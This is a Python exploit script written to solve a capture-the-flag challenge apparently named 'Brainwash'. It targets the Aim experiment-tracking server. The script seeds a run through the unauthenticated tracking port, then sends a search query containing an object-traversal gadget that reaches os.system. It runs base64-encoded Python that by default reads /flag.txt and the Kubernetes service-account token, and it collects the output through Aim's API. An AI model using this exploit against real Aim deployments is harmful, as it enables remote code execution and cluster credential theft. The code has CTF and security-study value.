#!/usr/bin/env python3
"""Brainwash one-shot solve: self-seed Aim, trigger AimQL RCE, print flag1."""

from __future__ import annotations

import argparse
import base64
import json
import re
import secrets
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

FLAG_RE = re.compile(r"avito\{[^}\r\n]+\}")
GADGET = 'run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"]'
DEFAULT_COMMAND = (
    "id; hostname; cat /flag.txt; "
    "echo ===SERVICE-ACCOUNT===; "
    "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; "
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
)


def http(
    base: str,
    path: str,
    params: dict[str, str] | None = None,
    *,
    timeout: float = 40,
) -> tuple[int, bytes]:
    """Issue a target GET and preserve HTTP error bodies for diagnostics."""
    url = base.rstrip("/") + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    request = urllib.request.Request(url)
    try:
        response = urllib.request.urlopen(request, timeout=timeout)
        return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()
    except OSError as error:
        return 0, str(error).encode()


def json_body(base: str, path: str) -> Any:
    """Decode one JSON response or raise with the status/body attached."""
    status, body = http(base, path)
    if status != 200:
        raise RuntimeError(f"GET {path}: HTTP {status}: {body[:500]!r}")
    return json.loads(body)


def num_runs(base: str) -> int:
    """Return Aim's current run count, or -1 for an unexpected response."""
    try:
        body = json_body(base, "/api/projects/activity/")
        return int(body.get("num_runs", -1))
    except (RuntimeError, TypeError, ValueError, json.JSONDecodeError):
        return -1


def seed_run(tracking_host: str, tracking_port: int, base: str, timeout: float) -> None:
    """Create exactly one run through the unauthenticated external Aim tracking server."""
    from aim import Run

    repo = f"aim://{tracking_host}:{tracking_port}"
    print(f"[seed] creating one Run through {repo}")
    run = Run(repo=repo, experiment="medoed-self-seed")
    run["pwn"] = "one-run-is-enough"
    run.close()
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        count = num_runs(base)
        if count > 0:
            print(f"[seed] num_runs={count}")
            return
        time.sleep(1)
    raise TimeoutError("tracking Run was created but never appeared in the web repository")


def remote_python(command: str, experiment: str) -> str:
    """Build idempotent remote Python that stores command output in an Aim run parameter."""
    return (
        "import os,subprocess,traceback\n"
        f"gate='/tmp/rce-once-{experiment}'\n"
        "if not os.path.exists(gate):\n"
        " open(gate,'w').write('1')\n"
        f" cmd={command!r}\n"
        " try:\n"
        "  p=subprocess.run(['bash','-lc',cmd],capture_output=True,timeout=90)\n"
        "  out=(p.stdout+p.stderr).decode('utf-8','replace')\n"
        " except Exception:\n"
        "  out=traceback.format_exc()\n"
        " from aim import Run\n"
        f" r=Run(repo='/data/repo',experiment={experiment!r})\n"
        " r['out']=out\n"
        " r.close()\n"
    )


def aimql_query(command: str, experiment: str) -> str:
    """Encode the remote program in a shell command reached through the AimQL gadget."""
    encoded = base64.b64encode(remote_python(command, experiment).encode()).decode()
    shell = f"echo {encoded}|base64 -d|python3"
    literal = shell.replace("\\", "\\\\").replace('"', '\\"')
    return f'{GADGET}.system("{literal}") or 1'


def fire_rce(base: str, command: str, experiment: str) -> None:
    """Trigger the expression once by limiting AimQL evaluation to its first run."""
    status, body = http(
        base,
        "/api/runs/search/run",
        {
            "q": aimql_query(command, experiment),
            "limit": "1",
            "skip_system": "false",
            "report_progress": "false",
        },
    )
    print(f"[rce] HTTP {status}, response={len(body)} bytes")
    if status != 200:
        raise RuntimeError(f"AimQL request failed: {body[:1000]!r}")


def poll_output(base: str, experiment: str, timeout: float) -> str:
    """Read the RCE output from the local Aim run even on a read-only root filesystem."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            experiments = json_body(base, "/api/experiments")
            experiment_id = next(
                item["id"] for item in experiments if item.get("name") == experiment
            )
            runs = json_body(base, f"/api/experiments/{experiment_id}/runs").get("runs", [])
            for run in runs:
                info = json_body(base, f"/api/runs/{run['run_id']}/info")
                output = info.get("params", {}).get("out")
                if isinstance(output, str):
                    return output
        except (RuntimeError, StopIteration, TypeError, KeyError, json.JSONDecodeError):
            pass
        time.sleep(1)
    raise TimeoutError("RCE fired, but its Aim parameter output did not appear")


def normalize_target(target: str, web_url: str | None) -> tuple[str, str]:
    """Return normalized web base URL and the hostname used by the tracking SDK."""
    base = web_url or (target if "://" in target else f"http://{target}")
    parsed = urllib.parse.urlsplit(base)
    if not parsed.hostname:
        raise ValueError(f"cannot derive a host from {base!r}")
    return base.rstrip("/"), parsed.hostname


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", nargs="?", help="challenge hostname/IP, or a full web URL")
    parser.add_argument("--web-url", help="override the Aim web base URL")
    parser.add_argument("--tracking-host", help="override the host used by aim://")
    parser.add_argument("--tracking-port", type=int, default=30800)
    parser.add_argument("--command", default=DEFAULT_COMMAND)
    parser.add_argument("--skip-seed", action="store_true")
    parser.add_argument("--seed-only", action="store_true")
    parser.add_argument("--timeout", type=float, default=75)
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()

    if args.self_test:
        query = aimql_query("printf avito{fixture}", "fixture")
        assert GADGET in query
        assert query.endswith(" or 1")
        assert "avito{fixture}" in remote_python("printf avito{fixture}", "fixture")
        print("self-test: OK")
        return
    if not args.target:
        parser.error("target is required unless --self-test is used")

    base, derived_host = normalize_target(args.target, args.web_url)
    tracking_host = args.tracking_host or derived_host
    if not args.skip_seed:
        seed_run(tracking_host, args.tracking_port, base, args.timeout)
    elif num_runs(base) < 1:
        raise RuntimeError("--skip-seed was requested, but Aim currently has no runs")
    if args.seed_only:
        return

    experiment = "rce-" + secrets.token_hex(5)
    fire_rce(base, args.command, experiment)
    output = poll_output(base, experiment, args.timeout)
    print(output)
    match = FLAG_RE.search(output)
    if not match:
        raise RuntimeError("RCE succeeded, but command output did not contain avito{...}")
    print(f"FLAG: {match.group(0)}")


if __name__ == "__main__":
    main()
